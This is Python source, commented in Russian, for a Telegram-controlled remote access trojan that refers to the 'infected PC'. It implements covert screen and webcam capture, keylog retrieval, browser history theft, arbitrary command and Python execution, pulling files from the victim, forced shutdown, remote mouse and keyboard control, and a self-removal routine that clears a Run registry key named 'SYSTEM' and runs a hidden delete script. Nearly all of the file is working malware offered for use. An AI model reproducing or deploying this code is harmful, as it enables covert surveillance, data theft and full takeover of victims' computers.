# Стандартные библиотеки
import getpass
import platform
import socket
import subprocess
import time
from datetime import datetime
from io import StringIO
from subprocess import Popen, PIPE
from time import strftime, sleep
import uuid
import winreg

# Сетевые
import requests
from urllib.request import urlretrieve

# Сторонние библиотеки
import cv2
import keyboard
import numpy as np
import pyautogui
from PIL import ImageDraw
from pynput.mouse import Controller, Button

# Локальные модули
from config import *
from loggers import get_browser_history_log_to_file

mouse = Controller()
current_working_directory = os.getcwd()


def checkchat_id(chat_id):
    return len(KNOWN_IDS) == 0 or str(chat_id) in KNOWN_IDS


def internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('google.com', 0))
    return s.getsockname()[0]


def move_mouse_direction(direction, offset):
    x, y = pyautogui.position()
    offset = int(offset)
    if direction == 'левее':
        x -= offset
    elif direction == 'правее':
        x += offset
    elif direction == 'выше':
        y -= offset
    elif direction == 'ниже':
        y += offset
    else:
        return None
    pyautogui.moveTo(x, y)
    return f"🖱️ Мышь перемещена {direction} на {offset} пикселей → новая позиция: ({x}, {y})"


def ping():
    return f"{platform.uname()[1]}: Я в сети ✅"


def confirm_self_destruct():
    return "⚠️ Вы уверены? Напишите /destroy для удаления"


def get_start_message():
    return (
        "🤖 Главное меню бота\n\n"
        "📌 Основные команды\n"
        "/start — Показать список команд\n"
        "/ping — Проверить активность бота\n\n"
        "📷 Работа с изображениями/видео\n"
        "/capture_pc — Сделать скриншот экрана\n"
        "/video_pc <sec> — Сделать запись экрана\n"
        "/capture_webcam — Сделать фото с веб-камеры\n"
        "/click_image — Кликает на место которое на фото(перед этим нужно это фото отправить)\n"
        "/wallpaper <путь или URL> — Установить обои на рабочий стол\n\n"
        "🔍 Информация о системе\n"
        "/ip_info — Показать IP и геолокацию\n"
        "/pc_info — Показать информацию о системе\n"
        "/ls <путь> — Показать содержимое папки\n\n"
        "💻 Управление системой\n"
        "/shutdown — Выключить компьютер\n"
        "/reboot — Перезагрузить компьютер\n"
        "/hot_keys — Горячие клавиши\n"
        "/close_tabs — Закрыть окна\n" 
        "/cmd_exec <команда> — Выполнить команду через CMD\n"
        "/open_browser <ссылка на сайт(можно оставить пустым)> — Открыть браузер/ссылку \n"
        "/python_exec <выражение> — Выполнить Python-выражение\n\n"
        "🔐 Логи и данные\n"
        "/keylogs — Показать логи клавиш\n"
        "/user_log — Показать логи пользователя\n"
        "/chrome_log — Извлечь историю Chrome\n"
        "/edge_log — Извлечь историю Edge\n\n"
        "📥 Работа с файлами\n"
        "/download <путь> — Получить файл в этот чат с зараженного ПК\n"
        "/create_more_folders <кол-во папок> <базовое имя> <текст> — Создать много папок с txt файлами\n"
        "/run <путь> — Запустить файл\n\n"
        "🖱️ Управление мышью\n"
        "/move_mouse_coord x y — Переместить курсор мыши\n"
        "/move_mouse (левее/правее/ниже/выше) x — Переместить курсор мыши на X\n"
        "/click_left_mouse — Кликнуть лев. кн. мыши\n"
        "/click_right_mouse — Кликнуть правой. кн. мыши\n"
        "/double_click — Кликнуть два раза\n\n"
        "📢 Взаимодействие с пользователем\n"
        "/msg_box <текст> — Показать сообщение на экране\n"
        "/message_write \"текст\" — Ввести текст в активное поле\n\n"
        "⚠️ Опасные команды\n"
        "/self_destruct — Запрос на удаление бота\n\n"
        "Можно отправить файл боту и он его скачает"
    )


def execute_cmd(command_text):
    global current_working_directory
    cmd = command_text.strip()

    # Обработка команды cd
    if cmd.lower().startswith('cd'):
        parts = cmd.split(maxsplit=1)
        if len(parts) == 2:
            new_path = parts[1].strip('"')
            resolved_path = os.path.abspath(os.path.join(current_working_directory, new_path))
            if os.path.isdir(resolved_path):
                current_working_directory = resolved_path
                return current_working_directory
            else:
                return f'Папка не найдена: {resolved_path}'
        else:
            return current_working_directory

    # Выполнение других команд
    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, cwd=current_working_directory)
    out, err = process.communicate()

    if sys.platform.startswith('win'):
        encoding = 'cp866'
    else:
        encoding = 'utf-8'

    return (out + err).decode(encoding, errors='replace') or '[пустой вывод]'


def open_browser(url="https://www.google.com/"):
    """Открывает браузер по умолчанию"""
    if not url:
        return "Ошибка: URL не указан"

    if sys.platform.startswith('win'):
        cmd = f'start "" "{url}"'
    else:
        return f"Ошибка"

    return execute_cmd(cmd)


def execute_hotkey(hotkey_combo):
    """Выполняет комбинацию горячих клавиш"""
    try:
        keyboard.press_and_release(hotkey_combo)
        return f"✅ Выполнено: {hotkey_combo}"
    except Exception as e:
        return f"❌ Ошибка выполнения: {e}"


def close_all_tabs():
    """Закрывает все открытые окна приложений"""
    try:
        closed_count = 0
        for _ in range(10):
            pyautogui.hotkey('alt', 'f4')
            time.sleep(0.3)
            closed_count += 1

        return f"✅ Отправлена команда на закрытие {closed_count} окон"
    except Exception as e:
        return f"❌ Ошибка при закрытии окон: {e}"


def capture_pc():
    screenshot = pyautogui.screenshot()
    cursor_x, cursor_y = pyautogui.position()

    draw = ImageDraw.Draw(screenshot)
    radius = 8
    draw.ellipse(
        (cursor_x - radius, cursor_y - radius, cursor_x + radius, cursor_y + radius),
        fill='red', outline='black'
    )  # рисуем круг там где курсор

    path = os.path.join(LOG_DIR, 'screenshot.jpg')
    screenshot.save(path)
    return path, f"🖱️ Координаты курсора: ({cursor_x}, {cursor_y})"


def click_image(confidence=0.9):
    """
    Ищет изображение на экране и кликает по нему
    """
    try:
        time.sleep(0.5)
        image_path = os.path.join(SCRIPTS_DIR, 'CLICK.png')

        location = pyautogui.locateCenterOnScreen(image_path, confidence=confidence)
        if location is None:
            return f"Изображение '{image_path}' не найдено"

        pyautogui.click(location)
        return f"Клик выполнен по изображению '{image_path}'"
    except:
        return f"Изображение не найдено"


def record_screen(duration_seconds=60):
    try:
        screen_size = pyautogui.size()
        fps = 15
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(LOG_DIR, f"screen_record_{timestamp}.mp4")

        out = cv2.VideoWriter(output_path, fourcc, fps, screen_size)
        frame_count = int(duration_seconds * fps)

        for _ in range(frame_count):
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            sleep(1 / fps)

        out.release()
        cv2.destroyAllWindows()

        return output_path, "✅ Запись с экрана отправлена"

    except Exception as e:
        return f"⚠️ Ошибка записи экрана: {e}"


def capture_webcam():
    camera = cv2.VideoCapture(0)
    ret, image = camera.read()
    path = os.path.join(LOG_DIR, 'webcam.jpg')
    if ret:
        cv2.imwrite(path, image)
        camera.release()
        return path
    camera.release()
    return None


def python_exec(code):
    temp_path = os.path.join(LOG_DIR, 'python_output.txt')
    old_stdout = sys.stdout
    sys.stdout = mystdout = StringIO()
    try:
        exec(code)
        sys.stdout = old_stdout
        result = mystdout.getvalue()
        if result.strip():
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(result)
            return temp_path, None
        else:
            return None, '✅ Код выполнен. Нет вывода.'
    except Exception as e:
        sys.stdout = old_stdout
        return None, f'⚠️ Ошибка выполнения: {e}'


def msg_box(text):
    if text:
        ctypes.windll.user32.MessageBoxW(0, text, u'📢 Сообщение', 0x40)
        return '📬 Окно сообщения показано.'
    return 'Использование: /msg_box ваш текст'


def move_mouse_coord(x, y):
    try:
        mouse.position = (x, y)
        return f'🖱️ Мышь перемещена в ({x}, {y})'
    except Exception as e:
        return f'Ошибка перемещения мыши: {e}'


def click_left_mouse():
    try:
        mouse.click(Button.left, 1)
        return '🖱️ Клик левой кнопки мыши выполнен'
    except Exception as e:
        return f'Ошибка клика: {e}'


def click_right_mouse():
    try:
        mouse.click(Button.right, 1)
        return '🖱️ Клик правой кнопки мыши выполнен'
    except Exception as e:
        return f"❌ Ошибка: {e}"


def double_click_left():
    try:
        pyautogui.doubleClick()
        return "🖱️ Двойной щелчок левой кнопки мыши"
    except Exception as e:
        return f"❌ Ошибка: {e}"


def message_write(text):
    try:
        keyboard.write(text, delay=0.05)
        return f'📨 Сообщение введено: "{text}"'
    except Exception as e:
        return f'⚠️ Ошибка ввода: {e}'


def get_pc_info():
    info = '\n'.join(platform.uname())
    return f"{info}\n👤 Пользователь: {getpass.getuser()}"


def get_ip_info():
    try:
        info = requests.get('http://ipinfo.io').json()
        location = info.get('loc', '0,0').split(',')
        ip = info.get('ip')
        city = info.get('city')
        region = info.get('region')
        internal = internal_ip()
        return {
            'location': (float(location[0]), float(location[1])),
            'text': f"🌐 IP: {ip}\n📍 Город: {city}, {region}\n🔒 Внутренний IP: {internal}"
        }
    except Exception as e:
        return {'location': (0.0, 0.0), 'text': f'Ошибка получения IP: {e}'}


def list_directory(path):
    try:
        files = os.listdir(path if path else os.getcwd())
        return '\n'.join(files)
    except Exception as e:
        return f'Ошибка при чтении директории: {e}'


def shutdown():
    os.system('shutdown /s /f /t 0')
    return '💤 Компьютер будет выключен сейчас.'


def reboot():
    os.system('shutdown /r /f /t 0')
    return '🔄 Компьютер будет перезагружен сейчас.'


def download_file(path):
    if os.path.isfile(path):
        return path
    return None


def run_file(path):
    if os.path.isfile(path):
        os.startfile(path)
        return f'Файл запущен: {path}'
    return f'Файл не найден: {path}'


def set_wallpaper(path):
    try:
        if path.startswith('http'):
            ext = '.jpg'
            filename = os.path.join(LOG_DIR, f"wallpaper_{uuid.uuid4().hex}{ext}")
            urlretrieve(path, filename)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, filename, 3)
            return 'Обои установлены с URL'
        elif os.path.isfile(path):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return 'Обои установлены с файла'
        else:
            return 'Файл не найден'
    except Exception as e:
        return f'Ошибка установки обоев: {e}'


def get_keylog_file():
    with open(KEYLOG_FILE, "a") as f:
        f.write("\n\n\n-------------------------------------------------\n")
        f.write(" Log: " + strftime("%b %d@%H:%M") + "\n")
    return KEYLOG_FILE


def get_user_log_file():
    with open(LOG_FILE, "w") as f:
        f.write("-------------------------------------------------\n")
        f.write(" Log: " + strftime("%b %d@%H:%M") + "\n")
    return LOG_FILE


def get_browser_log(browser='chrome', limit=150):
    return get_browser_history_log_to_file(browser=browser, limit=limit)


def remove_bot():
    """Удаляет бота из автозагрузки и удаляет файлы"""
    try:
        # Удаляем из автозагрузки
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "SYSTEM")
        winreg.CloseKey(key)

        # Создаем bat для удаления
        bat_path = os.path.join(os.environ['TEMP'], 'del.bat')
        with open(bat_path, 'w') as f:
            f.write(
                f'@echo off\ntimeout /t 1 /nobreak > nul\nrmdir /s /q "{BASE_DIR}"\ndel /f /q "{sys.argv[0]}"\ndel "%~f0"')

        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return "✅ Бот удален"
    except:
        return "❌ Ошибка"


def create_desktop_folders(count_folders, base_name, filler_text):
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    created = []
    errors = []

    for i in range(count_folders):
        folder_path = os.path.join(desktop, f"{base_name}_{i}")
        try:
            os.makedirs(folder_path, exist_ok=True)
            created.append(folder_path)

            # Создаём txt-файлы внутри папки
            for txt in range(count_folders):
                txt_path = os.path.join(folder_path, f"TXT_{txt}.txt")
                with open(txt_path, "w", encoding="utf-8") as f:
                    f.write(f"{filler_text * 10}")

        except Exception as e:
            errors.append(f"Ошибка при создании {folder_path}: {e}")

    if errors:
        return "\n".join(errors)
    return f"Создано {len(created)} папок с файлами:\n" + "\n".join(created)


